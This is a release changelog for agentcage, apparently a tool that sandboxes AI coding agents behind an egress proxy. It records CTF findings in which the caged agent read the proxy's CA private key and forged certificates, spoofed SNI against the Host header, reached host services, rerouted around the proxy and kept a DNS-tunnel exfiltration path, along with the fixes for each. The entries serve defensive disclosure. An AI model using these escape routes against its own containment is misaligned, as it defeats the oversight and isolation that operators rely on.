  the file mode (0600) + uid mismatch (199 vs 1000) blocked reads, but
  any future uid-map regression, mount-mode flip, or container escape
  would have promoted "escape this cage" into "mint trusted certs for
  every allowlisted host." CTF re-run on 0.22.7 flagged this as F6
  (container) and F9 (vm); both reports recommended the apple-container
  split done in #208.

  Split the volume mirroring the apple-container fix:
  - New `<name>-public-certs.volume` quadlet (`agentcage-public-certs-<name>`
    podman volume) holds the published public cert only.
  - Egress mounts BOTH: `agentcage-certs-<name>` at `/home/acproxy/.mitmproxy`
    (RW, for mitmproxy's own use including the private key) AND
    `agentcage-public-certs-<name>` at `/home/acproxy/public-certs` (RW,
    target of `supervisor-egress.sh` Step E's `install -m 0644 ...
    mitmproxy-ca-cert.pem`).
  - Cage now mounts ONLY `agentcage-public-certs-<name>` at `/certs:ro` —
    no path to the private key, regardless of uid mapping or file mode.

  Lifecycle wiring (`backends/container.py`, `backends/vm.py`) updated to
  start, restart, enumerate, and tear down the new volume alongside the
  existing one. `_QUADLET_FILES` includes the new suffix so `cage destroy`
  cleans it up.

## [0.22.9] - 2026-05-28

### Security

- **Egress addon now enforces strict SNI ↔ Host header match.** CTF
  finding F3 from the 0.22.6 re-run, HIGH severity. The previous
  `request()` hook rewrote `flow.request.host = pretty_host`
  unconditionally, so when a cage opened TLS with `SNI=A` and sent
  HTTP `Host: B` inside the TLS, mitmproxy's upstream connection
  followed the Host header (B) while every forensic identifier
  downstream (audit logs, allowlist decisions, secret-injection rule
  selection) keyed on A — the attacker chose which one fired at each
  decision point. CTF demonstrated by reaching api.anthropic.com over
  TLS with `SNI=evil.example` (Cloudflare's `set-cookie: Domain=
  api.anthropic.com` confirmed the upstream was real api.anthropic.com,
  no 403 from the addon). The fix adds a pre-rewrite check: if both
  SNI and Host are present and don't match (case-insensitive, port-
  stripped, trailing-dot tolerated), the addon emits 403 with reason
  `SNI/Host header mismatch`. HTTP requests with no SNI fall through
  to the Host header as before. Reverse-proxy flows are exempt — the
  SNI/Host relationship there is between an external client and the
  proxy's configured upstream.

## [0.22.8] - 2026-05-28

### Security

- **apple-container cage→host-gateway TCP and non-DNS UDP are now
  blocked at cage-init.** Headline finding F1 from the CTF re-run on
  0.22.6: Apple's container runtime puts the macOS host on the cage's
  vmnet subnet as the `.1` address, and the host's loopback services
  (sshd on `:22`, Apple Remote Desktop on `:5900`) were reachable
  directly via that gateway — completely OUTSIDE the egress proxy at
  `192.168.65.2:8080`, which only handles `:80`/`:443` via the
  REDIRECT rule. claude demonstrated banner-grabbing OpenSSH 10.2 and
  RFB 003.889 from inside the cage. Wrapper Containerfile now installs
  `iptables`; cage-init.sh stage B' (new) derives the host-gateway IP
  as `<subnet>.1` from the cage's own eth0 address and installs
  `iptables -A OUTPUT -d <gw> -p tcp -j DROP` plus
  `-p udp ! --dport 53 -j DROP`. UDP `:53` is kept open as a temporary
  exception because the cage's `/etc/resolv.conf` still points at the
  apple gateway in this commit (closed in a follow-up PR for F2).

## [0.22.7] - 2026-05-28

### Changed

- **apple-container scaffold-default warnings are no longer noisy.**
  Pre-0.22.7 every `agentcage run` on apple-container emitted three
  warnings about `container.tmpfs`, `container.userns`, and
  `container.read_only` — all triggered by the scaffold's standard
  defaults, not by operator intent. Predicates tightened:
  - `read_only`: warn only when explicitly set to `true` (real
    conflict — apple-container's rootfs is always RW). The default
    `false` matches backend behavior; no warning.
  - `userns`: warn only when set to something other than `"keep-id"`.
    The scaffold ships `keep-id` for the container backend's rootless-
    podman UID mapping; on apple-container the supervisor's drop-to-
    uid-1000 already achieves the same outcome.
  - `tmpfs`: warn only when the operator has multiple entries or a
    non-`/tmp` target. A single `/tmp:...` entry is the scaffold
    default; the cage's `/tmp` lives in the RW rootfs and is
    functionally writable for the workload.
  Explicit operator overrides still surface — only the defaulted
  noise is suppressed.

## [0.22.6] - 2026-05-28

### Security

- **apple-container cage no longer sees the egress's CA private key.**
  Headline finding from the CTF re-run on 0.22.5 (`F1`): the cage
  bound `certs_dir` (mitmproxy's full `~/.mitmproxy/` dir) at `/certs`
  so claude-code could install the public CA cert into its trust
  store. That dir also holds `mitmproxy-ca.pem` and `mitmproxy-ca.p12`
  (the CA *private* key + PKCS#12), mode 0600 but identity-mapped to
  uid 1000 via virtiofs — so a uid-1000 cage workload could read the
  key and sign a forged cert for any allowlisted host (the CTF
  generated a `forged-anthropic.crt` that verified cleanly against the
  cage's trust store). Regression introduced by #205 (the 0.22.3 CA
  env-var fix). Split the bind: cage now mounts a new
  `public_certs_dir` containing only `mitmproxy-ca-cert.pem`, populated
  by `supervisor-egress.sh` Step E (`install -m 0644 "$CA_PATH"
  /home/acproxy/public-certs/mitmproxy-ca-cert.pem`). The full
  `~/.mitmproxy/` dir stays egress-only.

## [0.22.5] - 2026-05-28

### Fixed

- **Egress secret-injection now works on the apple-container backend.**
  The mitmproxy `SecretInjector` only read real secret values from
  `os.environ[<env_name>]`. The container/podman backend wires that
  via Quadlet `Secret=type=env,target=<KEY>`, but apple-container
  deliberately doesn't pass cleartext via `-e KEY=VAL` (would leak
  through `container inspect` and process listings) — instead it
  bind-mounts the secret values as 0600 files at
  `/home/acproxy/secrets/<env-name>` on the egress sibling. The
  injector was unaware of those files, so on apple-container every
  outbound request sent the literal `{{PLACEHOLDER}}` upstream and got
  401'd. Add a file-delivery fallback: when env lookup misses, read
  from `$AGENTCAGE_SECRETS_DIR/<env-name>` (defaults to
  `/home/acproxy/secrets`). Env still takes precedence so the
  container backend's behavior is unchanged.

## [0.22.4] - 2026-05-28

### Fixed

- **apple-container cage workload now sees `HOME=/home/<user>`, not
  `HOME=/root`** (companion fix to 0.22.3). cage-init.sh stage D's
  capsh-drop and the F3 `cage exec` setpriv wrapper both change uid
  but leave env vars alone, so the dropped-priv workload inherited
  root's `HOME=/root` — which is mode 0700 and unreadable to uid
  1000. claude-code 2.1.x reads/writes `~/.claude/` on startup and,
  on EACCES there, silently exits 0 from `claude -p` (no error
  message, no stderr). Same surface hits npm (`~/.npm`),
  pip (`~/.cache/pip`), and anything else touching XDG_* paths.
  Stage D now exports `HOME`/`USER`/`LOGNAME` derived from
  `getent passwd 1000` before exec'ing capsh; the `cage exec`
  wrapper does the same via a small `sh -c` shim around setpriv.

## [0.22.3] - 2026-05-28

### Fixed

- **apple-container cage now trusts the egress MITM CA** via env vars,
  not just the system trust store. The 0.22.0 3→2-service unification
  (#200) dropped the `SSL_CERT_FILE` + `NODE_EXTRA_CA_CERTS` env vars
  the old single-VM supervisor.sh used to wire up; the slimmed cage VM
  was left relying only on cage-init.sh stage C's
  `update-ca-certificates` dance, which races with workload startup
  and silently no-ops on non-debian bases. Without these env vars
  `curl https://api.anthropic.com` inside the cage failed with
  "unable to get local issuer certificate", and claude-code 2.1.x
  silently exited 0 from `-p` when its HTTPS call failed — meaning
  the CTF agent (and every other claude-code workload on
  apple-container since 0.22.0) was running blind. Wire the two env
  vars at `container run` time so HTTPS clients trust the proxy CA
  immediately. Mirrors `cage.container.j2` lines 14-15 on the
  container backend.

## [0.22.2] - 2026-05-27

### Security

- **apple-container `cage exec` no longer arrives with NoNewPrivs=0 +
  CapBnd=0xa80435fb** (CTF F3). Previously every `container exec`
  session arrived at the cage workload with the container's full
  --cap-add set (CAP_NET_ADMIN among them) and NoNewPrivs unset, so a
  uid-1000 process could exploit any setuid-root binary in the base
  image (ubuntu:24.04 ships `/usr/bin/su` as mode-4755) to regrant
  CapEff = CapBnd and chain to the F2 route-replace bypass without
  --as-root. Wrap the exec in `setpriv --reuid=1000 --regid=1000
  --clear-groups --no-new-privs --bounding-set=-all --inh-caps=-all`;
  initial USER is image-root so setpriv has CAP_SETPCAP to clear the
  bounding set. New posture matches cage-init.sh stage D's capsh-drop
  exactly (Uid=1000, CapBnd=0, NoNewPrivs=1).
- **apple-container `cage exec --as-root` drops CAP_NET_ADMIN**
  (CTF F2). The cage VM is started with `--cap-add CAP_NET_ADMIN`
  because cage-init.sh stage B needs it to install the default route
  via the egress sibling. Apple's runtime reconstructs that cap in
  CapEff on every `container exec --user 0`, so before this fix an
  operator with `--as-root` could `ip route replace default via
  <apple-gw>` and reach the open internet without mitmproxy
  interposition — a full egress bypass via the operator-debug door.
  Wrap `--as-root` in `setpriv --bounding-set=-net_admin
  --inh-caps=-net_admin`; uid stays 0 (operator's debug intent) but
  NET_ADMIN is cleared from CapBnd, so route replace returns EPERM.
  CHOWN/FOWNER/SETUID/SETGID/SETPCAP/etc. survive so apt-get install
  and similar debug ops still work.

### Added

- **`cage create` warns when an apple-container cage has rw host bind
  mounts** (CTF F4). apple-container uses Apple's identity uid_map
  (`0 0 4294967295` — no user-namespace shift). Any rw host bind
  mount lets the cage workload write to anything readable by the
  macOS user via the virtiofs lower layer. Container/VM backends
  shift uids via rootless podman's user namespace so they don't have
  this property. Doc-only — doesn't block create; named volumes and
  `:ro` binds are exempted.

### Known residuals

- **DNS-tunnel exfil via Apple's vmnet gateway** (CTF F1) is still
  open on apple-container. Cage's `/etc/resolv.conf` points at
  `192.168.65.1` (Apple's container vmnet gateway, real public DNS)
  rather than the egress sibling's dnsmasq. Rewriting it to the
  egress was attempted and confirmed to break apt-get update entirely
  — Apple's container network plugin silently drops UDP/53 between
  sibling containers (verified via `/proc/net/udp` drop-counter on
  the dnsmasq socket: zero packets delivered despite TCP-handshake
  reachability). Closing this requires either moving dnsmasq into the
  cage VM or a different cross-VM transport. Tracked for v0.23.

## [0.22.1] - 2026-05-27

### Fixed

- `agentcage cage list` no longer tags every newly-created cage as
  `(legacy v0.21 — destroy + recreate)`. `agentcage run` was writing
  `metadata.json` with only `scaffold` and `lifecycle`; the v0.22
  legacy-cage detector reads `agentcage_version` and defaults missing
  values to `0.0.0`, which parses as `(0, 0) < (0, 22)`. `agentcage
  cage create` already wrote the version. `agentcage run` now does
  too. Cages created on v0.22.0 via `agentcage run` keep showing as
  legacy until you destroy + recreate them, or hand-edit
  `~/.config/agentcage/cages/<name>/metadata.json` to add
  `"agentcage_version": "0.22.1"`.

## [0.22.0] - 2026-05-27

### Changed

- **Per-cage container shape collapses from 3 services to 2** (cage +
  proxy + dns → cage + egress). The new `agentcage-egress` image bundles
  mitmproxy + dnsmasq + iptables behind a single tini-supervised PID 1.
  All three backends (container, vm, apple-container) consume the same
  image:
  - `container` and `vm`: the `<name>-egress.container` Quadlet replaces
    the old `<name>-proxy` + `<name>-dns` units. `cage logs -s proxy/-s
    dns` are gone; use `-s egress`.
  - `apple-container`: now runs **two** microVMs per cage (slim cage VM
    + sibling egress VM). Secrets bind-mount lives ONLY in the egress
    VM — `cage exec --user 0 <cage>` cannot read injected secrets even
    as root, because they're in a different microVM's filesystem
    namespace. No mitmproxy / dnsmasq / iptables binaries in the cage
    VM either.

  Cages created on v0.21.x cannot be addressed by v0.22 commands: their
  containers carry the legacy `-proxy` / `-dns` names. A version-aware
  detector at every CLI entry exits with `error: cage … was created
  with v0.21…` and prints the migration procedure (`systemctl --user
  stop … && cage destroy && cage create`). `cage destroy` and `cage
  list` are exempt so the escape hatch and the listing remain usable.

### Security

- **mitmproxy regular proxy now binds to the egress's cage-net IP**,
  not 0.0.0.0. The egress sits on the per-cage `{name}-net` AND the
  default `podman` network; an earlier draft of the supervisor used
  `--mode regular@:8080` (all interfaces) — any other rootless container
  on the host's default podman network could `curl --proxy
  http://<egress-podman-ip>:8080` and use this cage's allowlist +
  injected secrets as an open HTTP proxy. Bind narrowing restores the
  legacy proxy's posture. A residual remains: the cage-net IP is still
  reachable from other rootless containers via host inter-bridge
  routing, with SNAT rewriting the source into our cage subnet so an
  INPUT source filter doesn't catch it; same issue in the legacy
  3-service shape. Mitigation requires either dropping `Network=podman`
  from the egress quadlet (and finding a different outbound path) or
  host-level pf/nft rules outside the container's reach — tracked.
- **Custom port policy from cage.yaml is honoured again** under the new
  shape. The first cut of `egress.container.j2` passed
  `ports.tcp.allow` / `ports.tcp.passthrough` / `ports.udp.allow` to the
  template renderer but never emitted them — the supervisor fell back
  to a hard-coded `INSPECTED_TCP_PORTS="80 443"`. Any cage that
  configured e.g. `tcp.allow: [80, 443, 8000]` silently lost the
  PREROUTING REDIRECT for port 8000. The Quadlet now emits the three
  lists as `Environment="INSPECTED_TCP_PORTS=…"` etc.; the supervisor
  consumes them via `${VAR-default}` (preserves intentional empty
  config). Regression tests pinned in `test_quadlets.py`.

### Fixed

- **`domain add` / `domain rm` SIGHUP path now actually fires.** The
  initial supervisor wrote dnsmasq's pidfile to `/run/agentcage/
  dnsmasq.pid` but the CLI's reload path did
  `kill -HUP "$(cat /run/dnsmasq.pid)"` — path mismatch, `cat` returned
  empty, `kill -HUP ""` no-op'd silently, dnsmasq kept the stale
  allowlist. The unit test pinned the wrong path so the regression
  survived in CI. Pidfile is now under `/home/acdns/` (pre-chowned at
  image build time) and the SIGHUP shell aborts if the pidfile is
  missing rather than no-op'ing.
- **Egress container starts on hardened rootless podman**
  (`containers.conf` with `default_capabilities = []`). The supervisor's
  setpriv drop chain, runtime chown, cross-uid `kill -0` monitoring,
  and `/var/log/agentcage/ready` touch all required caps that aren't in
  the hardened default set. The Quadlet now requests SETUID, SETGID,
  SETPCAP, and KILL explicitly; the runtime chown is eliminated (pidfile
  dir is pre-chowned at build time); `/var/log/agentcage` is mode 1777
  with a sticky bit so root can write the ready marker without
  CAP_DAC_OVERRIDE. The apple-container backend's `container run` argv
  was updated to match.
- **apple-container `phase_apple.sh` e2e** — `cage create` no longer
  takes a positional cage name (it reads from `cage.yaml`); `cage
  destroy` flag is `-y` not `--force`; the test now bootstraps `curl`
  via apt inside the cage (ubuntu:24.04 base ships without it) and adds
  the apt mirrors to the allowlist for that one connectivity probe.
- **`cage logs/exec/shell -s egress`** is now accepted on every
  backend's CLI. The container/vm path uses `["cage", "egress"]` (the
  legacy `proxy` / `dns` are rejected at parse time per the new
  service_names shape); the apple-container path uses the same names.

## [0.21.19] - 2026-05-27

### Added

- `agentcage run --as-root` flag is now wired up end-to-end. It was
  silently swallowed before: `execute()` had an `as_root: bool` parameter
  but the Click command never registered the option. The flag now reaches
  the backend and runs the session as uid 0 when set.

### Changed

- **container + vm exec sessions now drop to uid 1000 by default**
  (matching apple-container's existing capsh-hardened behaviour). The
  cage Quadlet's `User=` may be empty (the ubuntu scaffold uses
  `user: ""` because uid 1000 has no named user in a minimal ubuntu
  base), so `podman exec` was inheriting the image's `USER` directive —
  which is `root` on `ubuntu:latest`. Result: `agentcage run ubuntu`
  on Linux container or VM landed at uid 0 while the apple-container
  path correctly ran as uid 1000. Fixed by passing explicit `-u
  1000:1000` (or `-u 0:0` with `--as-root`) to `podman exec` in both
  `ContainerBackend.exec_argv` and `VmBackend.exec_argv`, and aligning
  `cage shell` to do the same. Anything relying on the previous
  accidental-root behaviour will need `--as-root`.
- `run.py` routes all backends through `backend.exec_argv()` instead of
  branching on isolation type, so the three backends now share the same
  exec abstraction.

## [0.21.18] - 2026-05-27

### Fixed

- VM cages still couldn't start after v0.21.17: the proxy + dns quadlets
  emitted `Volume=~/.config/agentcage-vm/cages/<name>/...` and
  podman-quadlet doesn't expand `~`. Podman then treated the path as a
  named-volume reference, which failed the `[a-zA-Z0-9_.-]*` name
  validator with `creating named volume "~/...": names must match ...:
  invalid argument`. Switched `vm_local_config_dir()` to the systemd
  specifier `%h`, which systemd-quadlet expands to the user's home
  before podman parses the unit. Updated the shell-context substitution
  in `push_config_files` to swap `%h` for the real `$HOME` (bash does
  not expand systemd specifiers). New `test_quadlets_do_not_emit_unexpanded_tilde_volume`
  regression scans every generated quadlet for `Volume=~` so this can't
  recur.
- End-to-end validated: `agentcage run ubuntu --isolation vm` builds and
  starts the cage cleanly, `domain add` / `domain rm` live-reload
  dnsmasq via SIGHUP without restarting the container, and
  `getent hosts example.com` from inside the cage resolves through the
  updated allowlist.

## [0.21.17] - 2026-05-27

### Fixed

- `agentcage run --isolation vm` failed with `mkdir: cannot create directory
  '~': Permission denied` after the v0.21.16 dnsmasq live-reload changes.
  `push_config_files` wrapped tilde-prefixed paths in `shlex.quote()`, which
  suppressed shell expansion so `~` reached the guest as a literal directory
  name. Fix resolves `$HOME` in the guest once and rewrites the paths to
  absolute form before quoting. New regression test scans every shell argv
  for unexpanded tildes so the next time this slips in, it gets caught at
  unit-test time instead of at the user's first VM cage launch.

## [0.21.16] - 2026-05-26

A torture session against v0.21.15's `agentcage run -i` exposed that the
interactive-domains prompt had been dead since #56 in v0.10.0 — matcher
mismatch, dedup bug, and ultimately a TTY-ownership conflict between
`podman exec -it` and the monitor's `/dev/tty` read that can't be fixed
without a pty forwarder refactor. Following the thread surfaced a deeper
issue: `domain add` / `domain rm` were restarting the entire cage stack
to apply changes (killing any interactive session), and on the VM
backend the restart didn't even pick up the new bytes because Lima's
reverse-sshfs mount caches host writes. Cleaning that up paid for the
cycle: container and VM cages now live-reload domain edits without
restarting the cage, the broken `-i` flag is gone, and `cage edit` is
back with validation, atomic-write, backup, and auto-reload.

### Added

- **`agentcage cage edit NAME` — restored, with teeth.** Opens the stored
  `cage.yaml` in `$EDITOR`, then on save (1) validates the edited YAML
  through the same `validate_config` path that `cage create` runs —
  rejected edits land in `cage.yaml.rejected` so they aren't lost, and the
  original `cage.yaml` is untouched on failure; (2) backs up the previous
  good config to `cage.yaml.bak`; (3) writes the new config atomically
  (temp file + `rename`) so a crash mid-edit cannot corrupt cage state;
  (4) shows a unified diff of what changed; (5) live-applies domain
  changes via the dnsmasq SIGHUP path landed in #187 — no cage restart,
  any interactive session inside the cage survives; (6) refreshes
  `proxy-config.yaml` so the mitmproxy addon's mtime poller hot-reloads
  inspector / rate-limit / logging changes; (7) prints the exact next
  command (`cage restart` vs. `cage update`) for changes that need one.
  Aliased as `cage config`. Removed in #74 on the grounds it was a
  "trivial `click.edit` wrapper"; the restored version earns its keep by
  doing validation + atomic-write + auto-reload that a bare
  `$EDITOR ~/.config/agentcage/cages/NAME/cage.yaml` can't.

### Removed

- **`agentcage run -i / --interactive-domains` flag.** The feature has
  been dead since #56 landed in v0.10.0: the matcher compared
  `entry["reason"] == "domain"` against what the proxy actually emits
  (`"domain not in allowlist: <host>"`), so the prompt never fired in
  production. Fixing the matcher then surfaced two more issues — the
  dedup set added the host BEFORE deriving the parent (so 2-label hosts
  like `foo.com` deduped against themselves and were silently skipped),
  and ultimately `podman exec -it` puts the host TTY in raw mode and
  forwards every keystroke into the cage shell before the monitor's
  `select()` on `/dev/tty` can read it. The `y` response goes to the
  cage shell as a command (`sh: y: not found`), not the prompt. Fixing
  the input race requires reparenting the cage shell behind our own pty
  forwarder and intercepting keystrokes — a substantial refactor for a
  feature that no one was successfully using. Removed instead.
  Blocked-domain notifications still print on the host terminal as
  before. To allowlist a domain mid-session: run
  `agentcage domain add NAME DOMAIN` from another terminal — after the
  companion change in this release, that's instant and doesn't restart
  the cage.

### Changed

- **`fix(cli)`: `domain add` / `domain rm` are now live-reload on the
  VM (Lima) backend too — closes the VM half of #187.** Container cages
  shipped live-reload in #187, but the VM path still hit a hard wall:
  Lima's reverse-sshfs mount of `~/.config/agentcage` caches host writes,
  so a host-side rewrite of `proxy-config.yaml` / `dns-allowlist.conf`
  was invisible to processes inside the VM and dnsmasq SIGHUP would
  re-read the same stale cached bytes. (The legacy restart-all path had
  the same root cause and was also silently broken on VM — operators
  worked around it by destroying and recreating the cage.) Fix: the
  proxy and dns quadlets now bind-mount a VM-local copy of those files
  at `~/.config/agentcage-vm/cages/<name>/...` (outside any Lima mount).
  `cage create` / `start` / `restart` / `domain add` / `domain rm` all
  push the latest host bytes into the VM-local path via `inst.exec`
  (base64 over the limactl ssh channel — no sshfs in the loop), then
  SIGHUP dnsmasq the same way the container backend does. Mitmproxy's
  mtime poll picks up the proxy-config rewrite on the next request. Net
  effect: VM domain changes are roughly instant and any interactive
  session inside the cage survives the edit. Pre-upgrade cages whose
  on-disk quadlet still bind-mounts the cached host path are migrated
  automatically by `_ensure_dns_quadlet_current` on the first edit (one
  `daemon-reload` + `systemctl --user restart <name>-dns.service` — every
  subsequent edit on that cage takes the SIGHUP fast path). The
  authoritative state still lives at the host path, so `cage backup` and
  audit tooling are unchanged. The apple-container path is unchanged
  (tracked in #120).
- **`fix(cli)`: `domain add` / `domain rm` no longer restart the cage on
  the container backend.** They now write the updated allowlist files
  and `pkill -HUP dnsmasq` inside the dns sidecar — the mitmproxy addon
  already hot-reloads its config via mtime polling, and dnsmasq re-reads
  `--servers-file` on SIGHUP. Net effect on container cages: a domain
  change is roughly instant, and any interactive session inside the cage
  (e.g. `agentcage run`) survives the update. Why `pkill` instead of
  `podman kill --signal HUP`: PID 1 in the dns container is the
  `dns-audit.sh` wrapper, not dnsmasq itself, so the signal would be
  eaten by the wrapper. The apple-container path is unchanged (the
  allowlist is baked into the wrapper image at build time — needs the
  larger #120 change to add a bind-mounted allowlist).

## [0.21.15] - 2026-05-26

Two apple-container parity fixes surfaced by the torture-mac plan against v0.21.13.

### Fixed

- **apple-container honors `container.env:`.** The container backend wires `cc.env` to systemd Quadlet `Environment=` entries via `quadlets.py:338`, but the apple-container backend's `start()` never read `cfg.container.env` — every entry was silently dropped, and `validate_config`'s `_ac_silent_drops` list didn't include it either, so the operator got no warning. A cage.yaml with `container.env: {FOO: bar}` had `FOO` set on Linux/container and unset on apple-container. `generate_units` now persists `container.env` (with `$VAR` already expanded host-side, matching the quadlets behavior) into the per-cage unit JSON; `start()` reads it back and emits one `-e KEY=VAL` per entry to `container run`, sequenced before the `secret_injection` placeholder `-e` so the two never collide. Surfaced by torture-mac F1 against v0.21.13.
- **`apple_container_autostart: true` plists now actually load.** Pre-fix the install path called `launchctl unload <plist>` then `launchctl load -w <plist>`. `load -w` is deprecated since macOS 10.10 and frequently silently no-ops in non-TTY contexts — the symptom was `~/Library/LaunchAgents/io.agentcage.<cage>.plist` existing on disk but `launchctl list | grep io.agentcage` showing nothing, so autostart never triggered at next login. Switch the install path to the modern API: `launchctl bootout gui/<uid>/<label>` (drop any prior version) then `launchctl bootstrap gui/<uid> <plist>` (install into the GUI user's domain — the right form for `~/Library/LaunchAgents/`). If `bootstrap` fails for any reason (very old macOS, no GUI session, exotic permissions), fall back to the legacy `load -w` path so the operator never gets worse than the prior behavior; warn loudly only when both fail. Uninstall mirrors the install: `bootout` for services from the new path + `unload` as a belt for fallback-path services. Surfaced by torture-mac F2 against v0.21.13.

## [0.21.14] - 2026-05-26

UX hardening pass driven by a live torture session against v0.21.13 on
Linux (container + Lima VM). Four operator-visible papercuts closed,
zero behavior changes for working setups.

### Fixed

- **`fix(vm)`: `--workdir /` on every `limactl shell` argv, not just
  `LimaInstance.exec`.** v0.21.13 fixed the `cd: <host-cwd>: No such
  file or directory` warning for one helper but the argv builders for
  `cage exec` / `cage shell` / `cage logs` / `cage audit` on VM cages
  built their own argv with `os.execvp` and bypassed the helper. The
  warning was back on every VM exec. `vm.exec_argv`, `vm.logs_argv`,
  `vm.audit_argv`, and the inline `limactl shell` invocations in
  `cli.py:_logs_vm` + `cli.py:cage_shell` now all pin `--workdir /`.
- **`fix(cli)`: `cage exec` on a stopped cage now exits with a friendly
  "cage is not running — start it with 'agentcage cage start <name>'
  first" instead of letting the raw downstream error surface.**
  Pre-fix the operator got `Error: no container with name or ID
  "<name>-cage" found` (container, exit 125) or `instance "<name>" is
  stopped` (vm, exit 1) — both buried the actual problem. Pre-flight
  checks `backend.is_running(name, "cage")` before dispatching to
  `exec_argv`.
- **`fix(cli)`: `cage restart` waits up to 30s for the cage to reach
  `active` before returning.** Pre-fix, `cage restart` returned the
  moment systemd had kicked off the unit; `cage ls` right after showed
  `degraded (2/3)` for a few seconds until the cage container finished
  starting, scaring the operator. `services.restart_cage` now polls
  `backend.is_running` post-restart so the command only returns once
  the cage is actually up.
- **`fix(config)`: invalid YAML in `cage.yaml` now surfaces as a clean
  one-line error with file:line:column instead of a raw
  `yaml.scanner.ScannerError` Python traceback.** `load_config`
  catches `yaml.YAMLError` and re-raises `ValueError` with the
  problem mark; the CLI catches `ValueError` and prints
  `error: <path> is not valid YAML at line N, column N: <message>`
  before exiting 1. Same friendly treatment for OSError.

### Tests

- `tests/test_cage_cli.py::TestCageExec::test_exec_refuses_stopped_cage`
  — proves the friendly stopped-cage error path.
- `test_exec_vm_uses_limactl` updated for `--workdir /` and the
  pre-flight (mocks both `LimaInstance` import sites).
- `test_logs_vm_default` updated for `--workdir /`.
- `tests/test_apple_container_cli.py::TestCageExecAppleContainer` three
  tests updated to mock `ac_cli.inspect` so the new is_running
  pre-flight passes.
- `tests/test_config.py::TestLoadConfigEdgeCases::test_invalid_yaml_*`
  + `test_unreadable_file_raises_valueerror` — clean-error contract
  for YAML and OSError paths.

## [0.21.13] - 2026-05-26

Follow-up to 0.21.12 that closes the next layer of VM-backend UX
problems: silent systemd failures, a flaky first-attempt cage start,
and a default `TimeoutStartSec` that's too tight for slow VMs.
Confirmed end-to-end on a Linux host running a Lima VM with the pi
scaffold — `pi-ctf-vm` went from "degraded (2/3), cage timing out
at 60s" to "running (3/3), cage active in <300s" after `cage update`.

### Fixed

- **`fix(vm)`: `cage update` / `cage create` no longer silently
  succeed when the cage fails to start.** `_deploy_cage` now verifies
  the cage reaches `active` after the start attempt; a failure
  raises `RuntimeError` and the CLI exits non-zero. Previously the
  CLI printed `Updated cage <name>` while `cage verify` reported
  the cage was dead.
- **`fix(vm)`: stop swallowing stderr on systemctl start failures
  inside the VM.** Operator now sees `systemctl status` + the
  unit's last 40 `journalctl` lines on failure, surfaced through
  the new `_systemctl_start` + `_dump_service_failure` helpers.
  Previously the operator got `Command '[...]' returned non-zero
  exit status 1` and had to `limactl shell` in to find out why.
- **`fix(vm)`: kill the spurious first-attempt cage start failure.**
  The cage was started in the same loop as proxy/dns, before the
  wait-for-proxy block. Its `ExecStartPre` (which polls for
  mitmproxy's CA cert for up to 30s) raced mitmproxy startup and
  reliably emitted a scary "failed to start <name>-cage" warning.
  The cage now only starts AFTER proxy is confirmed active; if
  proxy never reaches active, `cage update` aborts with the
  proxy's failure log instead of pretending to start the cage.
- **`fix(vm)`: floor `TimeoutStartSec` to 300s for VM-mode cages.**
  The pi scaffold sets `timeout_start_sec: 60`, which is fine on
  bare metal but reliably times out inside a Lima VM where qemu
  boot + fuse-overlayfs layer extraction + per-cage podman
  network add 30-120s of overhead. `generate_units` now mutates
  the in-memory `cfg.container.timeout_start_sec` to `max(value,
  300)` for VM cages; on-disk `cage.yaml` is untouched. Floor
  applies on the next `cage update` (which regenerates quadlets);
  `cage restart` reuses the on-disk quadlet so the floor takes
  effect after a real update, not a restart.

### Tests

- `tests/test_vm_backend.py`: 4 new regression tests across
  `TestSystemctlStart` (stderr surfaced on failure, silent on
  success, restart verb wired correctly), `TestDeployCageStartOrder`
  (cage never appears before infra in the first start loop), and
  `TestGenerateUnits` (`test_floors_timeout_start_sec_for_vm`,
  `test_preserves_timeout_start_sec_above_floor`).

## [0.21.12] - 2026-05-26

Bugfix release for the VM backend and `cage update` ergonomics. No security
impact, no breaking changes. Affects every operator who has ever run a
VM-mode cage on Linux with secrets or seen "cd: No such file or directory"
chatter at start.

### Fixed

- **`fix(vm)`: `cage create -s KEY=VALUE` now delivers the secret verbatim
  on the VM backend.** `limactl shell` defaults `--tty` to true when the
  host's stdout is a terminal, and the resulting PTY's line discipline
  cooks piped stdin (CR↔LF translation, control-character handling)
  before `podman secret create -` reads it. The secret stored inside the
  VM no longer matched what the operator typed; cages saw a mangled
  value and 401d. `LimaInstance.exec` now pins `--tty=false` (alias `-y`)
  so SSH stays in pipe mode, and adds an `input=` passthrough so every
  caller benefits.
- **`fix(vm)`: stop printing `bash: line 1: cd: <path>: No such file or
  directory` on every VM operation.** `limactl shell` mirrors the host's
  `$PWD` inside the VM, and only `~/.config/agentcage` /
  `~/.local/share/agentcage` are mounted — every other cwd hit the cd
  warning. `LimaInstance.exec` now pins `--workdir /`; commands run from
  a known-mounted directory and the noise is gone. `VmPodman` and the
  three remaining inline `subprocess.run(["limactl", "shell", ...],
  input=...)` sites in `backends/vm.py` were refactored onto the helper
  so the flags apply everywhere.
- **`fix(cage update)`: `NAME` is now optional when `-c cage.yaml` is
  given.** Mirrors `cage create`, which has never required a positional
  `NAME` because the config's `name:` field is authoritative. Passing
  both still works; mismatch still errors. Passing neither prints a
  clear error.
- **`fix(cage update)`: the pre-deploy secrets check is now backend-aware.**
  Previously, on a Linux host with `podman` installed, every `cage update`
  on a VM or apple-container cage with `secret_injection:` rules queried
  host Podman, found nothing, and aborted with "missing secrets" — even
  when the secrets were correctly stored inside the VM (via
  `_create_pending_secrets`) or in `pending_secrets.json`
  (apple-container). The check now routes through `VmPodman` when the
  VM is running, reads `pending_secrets.json` for apple-container, and
  skips for a stopped VM (where `backend.start()` will recreate from
  the pending file before services come up).

### Tests

- `tests/test_lima_instance.py`: regression coverage that `exec` always
  passes `--workdir /` + `--tty=false` and forwards `input=`.
- `tests/test_cage_cli.py`: regression coverage that `cage update` works
  with `-c` alone (no `NAME`), errors cleanly when neither is given, and
  does not query host Podman for VM cages.

## [0.21.11] - 2026-05-26

CRITICAL hotfix for both backends. **Upgrade immediately for any deployment with `secret_injection:` configured.** Real injected secrets were landing in `capture.jsonl` (mode 0644, cage-readable) — defeats the entire placeholder-injection trust model. Confirmed via real-format key bytes on disk in a local e2e test capture.

### Security

